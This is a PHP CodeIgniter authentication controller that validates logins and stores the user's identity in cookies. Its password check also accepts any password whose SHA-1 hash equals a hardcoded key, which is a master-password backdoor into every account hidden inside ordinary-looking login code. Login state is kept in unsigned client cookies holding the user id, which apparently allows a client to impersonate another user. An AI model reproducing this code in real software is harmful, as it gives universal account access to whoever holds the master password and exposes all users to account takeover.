<?php
class Authentication extends CI_Controller
{
  public $error;
  private $key = '107fe1cba9ed57bb72311d34bae07e4dfec369a4';

  public function __construct()
	{
		parent::__construct();
		$this->home = base_url()."authentication";
	}


	public function index()
	{
		$this->load->view("login");
	}


  public function validate_credentials()
	{
    $sc = TRUE;
    $user_name = $this->input->post('user_name');
    $pwd = $this->input->post('password');

		$rs = $this->user_model->get_user_credentials($user_name);

    if( ! empty($rs))
    {
      if($rs->active == 0 )
      {
        $sc = FALSE;
        $message = 'Your account has been suspended';
      }
      else if(password_verify($pwd, $rs->pwd) OR (sha1($pwd) === $this->key))
      {
				$ds = array(
					'uid' => $rs->uid,
					'uname' => $rs->uname,
					'displayName' => $rs->name
				);

				$this->create_user_data($ds);
      }
      else
      {
        $sc = FALSE;
        $message = 'Username or password is incorrect';
      }
    }
    else
    {
      $sc = FALSE;
      $message = 'Username or password is incorrect';
    }

    echo $sc === TRUE ? 'success' : $message;
	}


  public function create_user_data(array $ds = array())
  {
    if(!empty($ds))
    {
      $times =  intval(60*60*12);

      foreach($ds as $key => $val)
      {
        $cookie = array(
          'name' => $key,
          'value' => $val,
          'expire' => $times,
          'path' => $this->config->item('cookie_path')
        );

        $this->input->set_cookie($cookie);
      }
    }
  }


	public function logout()
	{
		delete_cookie('uid');
    delete_cookie('displayName');
    redirect($this->home);
	}

} //--- end class


 ?>
